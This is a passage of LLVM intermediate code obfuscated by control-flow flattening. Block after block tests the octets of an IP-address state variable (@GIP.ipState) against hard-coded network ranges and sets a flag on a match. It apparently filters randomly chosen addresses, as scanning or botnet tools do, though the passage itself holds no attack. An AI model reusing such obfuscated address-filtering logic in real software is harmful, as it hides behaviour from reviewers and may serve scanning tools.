  %2457 = icmp eq i32 %2456, 208
  %2458 = select i1 %2457, i32 -1379062799, i32 -295072484
  store i32 %2458, i32* %switchVar
  br label %loopEnd

; <label>:2459:                                   ; preds = %loopEntry
  %2460 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2461 = zext i8 %2460 to i32
  %2462 = icmp eq i32 %2461, 93
  %2463 = select i1 %2462, i32 889109923, i32 -295072484
  store i32 %2463, i32* %switchVar
  br label %loopEnd

; <label>:2464:                                   ; preds = %loopEntry
  %2465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2466 = zext i8 %2465 to i32
  %2467 = icmp sge i32 %2466, 192
  %2468 = select i1 %2467, i32 -958902188, i32 -295072484
  store i32 %2468, i32* %switchVar
  br label %loopEnd

; <label>:2469:                                   ; preds = %loopEntry
  %2470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2471 = zext i8 %2470 to i32
  %2472 = icmp slt i32 %2471, 193
  %2473 = select i1 %2472, i32 -1813357520, i32 -295072484
  store i32 %2473, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2474:                                   ; preds = %loopEntry
  %2475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2476 = zext i8 %2475 to i32
  %2477 = icmp eq i32 %2476, 66
  %2478 = select i1 %2477, i32 1467381991, i32 -1593532198
  store i32 %2478, i32* %switchVar
  br label %loopEnd

; <label>:2479:                                   ; preds = %loopEntry
  %2480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2481 = zext i8 %2480 to i32
  %2482 = icmp eq i32 %2481, 71
  %2483 = select i1 %2482, i32 1832977605, i32 -1593532198
  store i32 %2483, i32* %switchVar
  br label %loopEnd

; <label>:2484:                                   ; preds = %loopEntry
  %2485 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2486 = zext i8 %2485 to i32
  %2487 = icmp sge i32 %2486, 240
  %2488 = select i1 %2487, i32 1744437577, i32 -1593532198
  store i32 %2488, i32* %switchVar
  br label %loopEnd

; <label>:2489:                                   ; preds = %loopEntry
  %2490 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2491 = zext i8 %2490 to i32
  %2492 = icmp slt i32 %2491, 255
  %2493 = select i1 %2492, i32 -1813357520, i32 -1593532198
  store i32 %2493, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2494:                                   ; preds = %loopEntry
  %2495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2496 = zext i8 %2495 to i32
  %2497 = icmp eq i32 %2496, 98
  %2498 = select i1 %2497, i32 -2125388429, i32 -476099999
  store i32 %2498, i32* %switchVar
  br label %loopEnd

; <label>:2499:                                   ; preds = %loopEntry
  %2500 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2501 = zext i8 %2500 to i32
  %2502 = icmp eq i32 %2501, 142
  %2503 = select i1 %2502, i32 2093282699, i32 -476099999
  store i32 %2503, i32* %switchVar
  br label %loopEnd

; <label>:2504:                                   ; preds = %loopEntry
  %2505 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2506 = zext i8 %2505 to i32
  %2507 = icmp sge i32 %2506, 208
  %2508 = select i1 %2507, i32 503490593, i32 -476099999
  store i32 %2508, i32* %switchVar
  br label %loopEnd

; <label>:2509:                                   ; preds = %loopEntry
  %2510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2511 = zext i8 %2510 to i32
  %2512 = icmp slt i32 %2511, 223
  %2513 = select i1 %2512, i32 -1813357520, i32 -476099999
  store i32 %2513, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2514:                                   ; preds = %loopEntry
  %2515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2516 = zext i8 %2515 to i32
  %2517 = icmp eq i32 %2516, 107
  %2518 = select i1 %2517, i32 1727631856, i32 -709315540
  store i32 %2518, i32* %switchVar
  br label %loopEnd

; <label>:2519:                                   ; preds = %loopEntry
  %2520 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2521 = zext i8 %2520 to i32
  %2522 = icmp sge i32 %2521, 20
  %2523 = select i1 %2522, i32 -645156040, i32 -709315540
  store i32 %2523, i32* %switchVar
  br label %loopEnd

; <label>:2524:                                   ; preds = %loopEntry
  %2525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2526 = zext i8 %2525 to i32
  %2527 = icmp slt i32 %2526, 24
  %2528 = select i1 %2527, i32 -1813357520, i32 -709315540
  store i32 %2528, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2529:                                   ; preds = %loopEntry
  %2530 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2531 = zext i8 %2530 to i32
  %2532 = icmp eq i32 %2531, 35
  %2533 = select i1 %2532, i32 1540617536, i32 -1670283322
  store i32 %2533, i32* %switchVar
  br label %loopEnd

; <label>:2534:                                   ; preds = %loopEntry
  %2535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2536 = zext i8 %2535 to i32
  %2537 = icmp sge i32 %2536, 159
  %2538 = select i1 %2537, i32 -308375336, i32 -1670283322
  store i32 %2538, i32* %switchVar
  br label %loopEnd

; <label>:2539:                                   ; preds = %loopEntry
  %2540 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2541 = zext i8 %2540 to i32
  %2542 = icmp slt i32 %2541, 183
  %2543 = select i1 %2542, i32 -1813357520, i32 -1670283322
  store i32 %2543, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2544:                                   ; preds = %loopEntry
  %2545 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2546 = zext i8 %2545 to i32
  %2547 = icmp eq i32 %2546, 52
  %2548 = select i1 %2547, i32 1361473790, i32 -776818780
  store i32 %2548, i32* %switchVar
  br label %loopEnd

; <label>:2549:                                   ; preds = %loopEntry
  %2550 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2551 = zext i8 %2550 to i32
  %2552 = icmp sge i32 %2551, 1
  %2553 = select i1 %2552, i32 1216153447, i32 -776818780
  store i32 %2553, i32* %switchVar
  br label %loopEnd

; <label>:2554:                                   ; preds = %loopEntry
  %2555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2556 = zext i8 %2555 to i32
  %2557 = icmp slt i32 %2556, 95
  %2558 = select i1 %2557, i32 -1813357520, i32 -776818780
  store i32 %2558, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2559:                                   ; preds = %loopEntry
  %2560 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2561 = zext i8 %2560 to i32
  %2562 = icmp eq i32 %2561, 52
  %2563 = select i1 %2562, i32 692540013, i32 -334867433
  store i32 %2563, i32* %switchVar
  br label %loopEnd

; <label>:2564:                                   ; preds = %loopEntry
  %2565 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2566 = zext i8 %2565 to i32
  %2567 = icmp sge i32 %2566, 95
  %2568 = select i1 %2567, i32 1468267867, i32 -334867433
  store i32 %2568, i32* %switchVar
  br label %loopEnd

; <label>:2569:                                   ; preds = %loopEntry
  %2570 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2571 = zext i8 %2570 to i32
  %2572 = icmp slt i32 %2571, 255
  %2573 = select i1 %2572, i32 -1813357520, i32 -334867433
  store i32 %2573, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2574:                                   ; preds = %loopEntry
  %2575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2576 = zext i8 %2575 to i32
  %2577 = icmp eq i32 %2576, 54
  %2578 = select i1 %2577, i32 748534843, i32 917620503
  store i32 %2578, i32* %switchVar
  br label %loopEnd

; <label>:2579:                                   ; preds = %loopEntry
  %2580 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2581 = zext i8 %2580 to i32
  %2582 = icmp sge i32 %2581, 64
  %2583 = select i1 %2582, i32 -784526, i32 917620503
  store i32 %2583, i32* %switchVar
  br label %loopEnd

; <label>:2584:                                   ; preds = %loopEntry
  %2585 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2586 = zext i8 %2585 to i32
  %2587 = icmp slt i32 %2586, 95
  %2588 = select i1 %2587, i32 -1813357520, i32 917620503
  store i32 %2588, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2589:                                   ; preds = %loopEntry
  %2590 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2591 = zext i8 %2590 to i32
  %2592 = icmp eq i32 %2591, 54
  %2593 = select i1 %2592, i32 -1947700347, i32 224742561
  store i32 %2593, i32* %switchVar
  br label %loopEnd

; <label>:2594:                                   ; preds = %loopEntry
  %2595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2596 = zext i8 %2595 to i32
  %2597 = icmp sge i32 %2596, 144
  %2598 = select i1 %2597, i32 118837071, i32 224742561
  store i32 %2598, i32* %switchVar
  br label %loopEnd

; <label>:2599:                                   ; preds = %loopEntry
  %2600 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2601 = zext i8 %2600 to i32
  %2602 = icmp slt i32 %2601, 255
  %2603 = select i1 %2602, i32 -1813357520, i32 224742561
  store i32 %2603, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2604:                                   ; preds = %loopEntry
  %2605 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2606 = zext i8 %2605 to i32
  %2607 = icmp eq i32 %2606, 13
  %2608 = select i1 %2607, i32 -1081621604, i32 -1083379702
  store i32 %2608, i32* %switchVar
  br label %loopEnd

; <label>:2609:                                   ; preds = %loopEntry
  %2610 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2611 = zext i8 %2610 to i32
  %2612 = icmp sge i32 %2611, 52
  %2613 = select i1 %2612, i32 -954006747, i32 -1083379702
  store i32 %2613, i32* %switchVar
  br label %loopEnd

; <label>:2614:                                   ; preds = %loopEntry
  %2615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2616 = zext i8 %2615 to i32
  %2617 = icmp slt i32 %2616, 60
  %2618 = select i1 %2617, i32 -1813357520, i32 -1083379702
  store i32 %2618, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2619:                                   ; preds = %loopEntry
  %2620 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2621 = zext i8 %2620 to i32
  %2622 = icmp eq i32 %2621, 13
  %2623 = select i1 %2622, i32 -1819624574, i32 -126472694
  store i32 %2623, i32* %switchVar
  br label %loopEnd

; <label>:2624:                                   ; preds = %loopEntry
  %2625 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2626 = zext i8 %2625 to i32
  %2627 = icmp sge i32 %2626, 112
  %2628 = select i1 %2627, i32 -816428847, i32 -126472694
  store i32 %2628, i32* %switchVar
  br label %loopEnd

; <label>:2629:                                   ; preds = %loopEntry
  %2630 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2631 = zext i8 %2630 to i32
  %2632 = icmp slt i32 %2631, 115
  %2633 = select i1 %2632, i32 -1813357520, i32 -126472694
  store i32 %2633, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2634:                                   ; preds = %loopEntry
  %2635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2636 = zext i8 %2635 to i32
  %2637 = icmp eq i32 %2636, 163
  %2638 = select i1 %2637, i32 -1064830578, i32 1172573812
  store i32 %2638, i32* %switchVar
  br label %loopEnd

; <label>:2639:                                   ; preds = %loopEntry
  %2640 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2641 = zext i8 %2640 to i32
  %2642 = icmp eq i32 %2641, 172
  %2643 = select i1 %2642, i32 -1813357520, i32 1172573812
  store i32 %2643, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2644:                                   ; preds = %loopEntry
  %2645 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2646 = zext i8 %2645 to i32
  %2647 = icmp eq i32 %2646, 51
  %2648 = select i1 %2647, i32 -397644298, i32 -651858032
  store i32 %2648, i32* %switchVar
  br label %loopEnd

; <label>:2649:                                   ; preds = %loopEntry
  %2650 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2651 = zext i8 %2650 to i32
  %2652 = icmp sge i32 %2651, 15
  %2653 = select i1 %2652, i32 -1336582622, i32 -651858032
  store i32 %2653, i32* %switchVar
  br label %loopEnd

; <label>:2654:                                   ; preds = %loopEntry
  %2655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2656 = zext i8 %2655 to i32
  %2657 = icmp slt i32 %2656, 255
  %2658 = select i1 %2657, i32 -1813357520, i32 -651858032
  store i32 %2658, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2659:                                   ; preds = %loopEntry
  %2660 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2661 = zext i8 %2660 to i32
  %2662 = icmp eq i32 %2661, 79
  %2663 = select i1 %2662, i32 22166668, i32 450276939
  store i32 %2663, i32* %switchVar
  br label %loopEnd

; <label>:2664:                                   ; preds = %loopEntry
  %2665 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2666 = zext i8 %2665 to i32
  %2667 = icmp eq i32 %2666, 121
  %2668 = select i1 %2667, i32 -485533958, i32 450276939
  store i32 %2668, i32* %switchVar
  br label %loopEnd

; <label>:2669:                                   ; preds = %loopEntry
  %2670 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2671 = zext i8 %2670 to i32
  %2672 = icmp sge i32 %2671, 128
  %2673 = select i1 %2672, i32 793535602, i32 450276939
  store i32 %2673, i32* %switchVar
  br label %loopEnd

; <label>:2674:                                   ; preds = %loopEntry
  %2675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2676 = zext i8 %2675 to i32
  %2677 = icmp slt i32 %2676, 255
  %2678 = select i1 %2677, i32 -1813357520, i32 450276939
  store i32 %2678, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2679:                                   ; preds = %loopEntry
  %2680 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2681 = zext i8 %2680 to i32
  %2682 = icmp eq i32 %2681, 212
  %2683 = select i1 %2682, i32 1660161949, i32 558545936
  store i32 %2683, i32* %switchVar
  br label %loopEnd

; <label>:2684:                                   ; preds = %loopEntry
  %2685 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2686 = zext i8 %2685 to i32
  %2687 = icmp eq i32 %2686, 47
  %2688 = select i1 %2687, i32 283365419, i32 558545936
  store i32 %2688, i32* %switchVar
  br label %loopEnd

; <label>:2689:                                   ; preds = %loopEntry
  %2690 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2691 = zext i8 %2690 to i32
  %2692 = icmp sge i32 %2691, 224
  %2693 = select i1 %2692, i32 -106572179, i32 558545936
  store i32 %2693, i32* %switchVar
  br label %loopEnd

; <label>:2694:                                   ; preds = %loopEntry
  %2695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2696 = zext i8 %2695 to i32
  %2697 = icmp slt i32 %2696, 255
  %2698 = select i1 %2697, i32 -1813357520, i32 558545936
  store i32 %2698, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2699:                                   ; preds = %loopEntry
  %2700 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2701 = zext i8 %2700 to i32
  %2702 = icmp eq i32 %2701, 89
  %2703 = select i1 %2702, i32 1206132446, i32 1457474226
  store i32 %2703, i32* %switchVar
  br label %loopEnd

; <label>:2704:                                   ; preds = %loopEntry
  %2705 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2706 = zext i8 %2705 to i32
  %2707 = icmp eq i32 %2706, 34
  %2708 = select i1 %2707, i32 -1764585213, i32 1457474226
  store i32 %2708, i32* %switchVar
  br label %loopEnd

; <label>:2709:                                   ; preds = %loopEntry
  %2710 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2711 = zext i8 %2710 to i32
  %2712 = icmp sge i32 %2711, 96
  %2713 = select i1 %2712, i32 -2086023915, i32 1457474226
  store i32 %2713, i32* %switchVar
  br label %loopEnd

; <label>:2714:                                   ; preds = %loopEntry
  %2715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2716 = zext i8 %2715 to i32
  %2717 = icmp slt i32 %2716, 97
  %2718 = select i1 %2717, i32 -1813357520, i32 1457474226
  store i32 %2718, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2719:                                   ; preds = %loopEntry
  %2720 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2721 = zext i8 %2720 to i32
  %2722 = icmp eq i32 %2721, 219
  %2723 = select i1 %2722, i32 -2093147312, i32 -116119570
  store i32 %2723, i32* %switchVar
  br label %loopEnd

; <label>:2724:                                   ; preds = %loopEntry
  %2725 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2726 = zext i8 %2725 to i32
  %2727 = icmp sge i32 %2726, 216
  %2728 = select i1 %2727, i32 1223764169, i32 -116119570
  store i32 %2728, i32* %switchVar
  br label %loopEnd

; <label>:2729:                                   ; preds = %loopEntry
  %2730 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2731 = zext i8 %2730 to i32
  %2732 = icmp slt i32 %2731, 231
  %2733 = select i1 %2732, i32 -1813357520, i32 -116119570
  store i32 %2733, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2734:                                   ; preds = %loopEntry
  %2735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2736 = zext i8 %2735 to i32
  %2737 = icmp eq i32 %2736, 23
  %2738 = select i1 %2737, i32 -1843648117, i32 -2016354658
  store i32 %2738, i32* %switchVar
  br label %loopEnd

; <label>:2739:                                   ; preds = %loopEntry
  %2740 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2741 = zext i8 %2740 to i32
  %2742 = icmp sge i32 %2741, 94
  %2743 = select i1 %2742, i32 -1855743470, i32 -2016354658
  store i32 %2743, i32* %switchVar
  br label %loopEnd

; <label>:2744:                                   ; preds = %loopEntry
  %2745 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2746 = zext i8 %2745 to i32
  %2747 = icmp slt i32 %2746, 109
  %2748 = select i1 %2747, i32 -1813357520, i32 -2016354658
  store i32 %2748, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2749:                                   ; preds = %loopEntry
  %2750 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2751 = zext i8 %2750 to i32
  %2752 = icmp eq i32 %2751, 178
  %2753 = select i1 %2752, i32 -140130423, i32 -875687168
  store i32 %2753, i32* %switchVar
  br label %loopEnd

; <label>:2754:                                   ; preds = %loopEntry
  %2755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2756 = zext i8 %2755 to i32
  %2757 = icmp sge i32 %2756, 62
  %2758 = select i1 %2757, i32 1671714500, i32 -875687168
  store i32 %2758, i32* %switchVar
  br label %loopEnd

; <label>:2759:                                   ; preds = %loopEntry
  %2760 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2761 = zext i8 %2760 to i32
  %2762 = icmp slt i32 %2761, 63
  %2763 = select i1 %2762, i32 -1813357520, i32 -875687168
  store i32 %2763, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2764:                                   ; preds = %loopEntry
  %2765 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2766 = zext i8 %2765 to i32
  %2767 = icmp eq i32 %2766, 106
  %2768 = select i1 %2767, i32 -1740016007, i32 686100670
  store i32 %2768, i32* %switchVar
  br label %loopEnd

; <label>:2769:                                   ; preds = %loopEntry
  %2770 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2771 = zext i8 %2770 to i32
  %2772 = icmp sge i32 %2771, 182
  %2773 = select i1 %2772, i32 -366768826, i32 686100670
  store i32 %2773, i32* %switchVar
  br label %loopEnd

; <label>:2774:                                   ; preds = %loopEntry
  %2775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2776 = zext i8 %2775 to i32
  %2777 = icmp slt i32 %2776, 189
  %2778 = select i1 %2777, i32 -1813357520, i32 686100670
  store i32 %2778, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2779:                                   ; preds = %loopEntry
  %2780 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2781 = zext i8 %2780 to i32
  %2782 = icmp eq i32 %2781, 106
  %2783 = select i1 %2782, i32 -1119245971, i32 -356511356
  store i32 %2783, i32* %switchVar
  br label %loopEnd

; <label>:2784:                                   ; preds = %loopEntry
  %2785 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2786 = zext i8 %2785 to i32
  %2787 = icmp sge i32 %2786, 184
  %2788 = select i1 %2787, i32 -1813357520, i32 -356511356
  store i32 %2788, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2789:                                   ; preds = %loopEntry
  %2790 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2791 = zext i8 %2790 to i32
  %2792 = icmp eq i32 %2791, 106
  %2793 = select i1 %2792, i32 692265457, i32 -584388925
  store i32 %2793, i32* %switchVar
  br label %loopEnd

; <label>:2794:                                   ; preds = %loopEntry
  %2795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2796 = zext i8 %2795 to i32
  %2797 = icmp eq i32 %2796, 105
  %2798 = select i1 %2797, i32 -1813357520, i32 -584388925
  store i32 %2798, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2799:                                   ; preds = %loopEntry
  %2800 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2801 = zext i8 %2800 to i32
  %2802 = icmp eq i32 %2801, 34
  %2803 = select i1 %2802, i32 1205514714, i32 1972723761
  store i32 %2803, i32* %switchVar
  br label %loopEnd

; <label>:2804:                                   ; preds = %loopEntry
  %2805 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2806 = zext i8 %2805 to i32
  %2807 = icmp sge i32 %2806, 245
  %2808 = select i1 %2807, i32 2086569993, i32 1972723761
  store i32 %2808, i32* %switchVar
  br label %loopEnd

; <label>:2809:                                   ; preds = %loopEntry
  %2810 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2811 = zext i8 %2810 to i32
  %2812 = icmp slt i32 %2811, 255
  %2813 = select i1 %2812, i32 -1813357520, i32 1972723761
  store i32 %2813, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2814:                                   ; preds = %loopEntry
  %2815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2816 = zext i8 %2815 to i32
  %2817 = icmp eq i32 %2816, 87
  %2818 = select i1 %2817, i32 -25759592, i32 1820069632
  store i32 %2818, i32* %switchVar
  br label %loopEnd

; <label>:2819:                                   ; preds = %loopEntry
  %2820 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2821 = zext i8 %2820 to i32
  %2822 = icmp sge i32 %2821, 97
  %2823 = select i1 %2822, i32 -148843199, i32 1820069632
  store i32 %2823, i32* %switchVar
  br label %loopEnd

; <label>:2824:                                   ; preds = %loopEntry
  %2825 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2826 = zext i8 %2825 to i32
  %2827 = icmp slt i32 %2826, 99
  %2828 = select i1 %2827, i32 -1813357520, i32 1820069632
  store i32 %2828, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2829:                                   ; preds = %loopEntry
  %2830 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2831 = zext i8 %2830 to i32
  %2832 = icmp eq i32 %2831, 86
  %2833 = select i1 %2832, i32 1838710244, i32 -1277860195
  store i32 %2833, i32* %switchVar
  br label %loopEnd

; <label>:2834:                                   ; preds = %loopEntry
  %2835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2836 = zext i8 %2835 to i32
  %2837 = icmp eq i32 %2836, 208
  %2838 = select i1 %2837, i32 -1813357520, i32 -1277860195
  store i32 %2838, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2839:                                   ; preds = %loopEntry
  %2840 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2841 = zext i8 %2840 to i32
  %2842 = icmp eq i32 %2841, 86
  %2843 = select i1 %2842, i32 2887051, i32 -714299684
  store i32 %2843, i32* %switchVar
  br label %loopEnd

; <label>:2844:                                   ; preds = %loopEntry
  %2845 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2846 = zext i8 %2845 to i32
  %2847 = icmp eq i32 %2846, 209
  %2848 = select i1 %2847, i32 -1813357520, i32 -714299684
  store i32 %2848, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2849:                                   ; preds = %loopEntry
  %2850 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2851 = zext i8 %2850 to i32
  %2852 = icmp eq i32 %2851, 193
  %2853 = select i1 %2852, i32 -665935141, i32 1196575377
  store i32 %2853, i32* %switchVar
  br label %loopEnd

; <label>:2854:                                   ; preds = %loopEntry
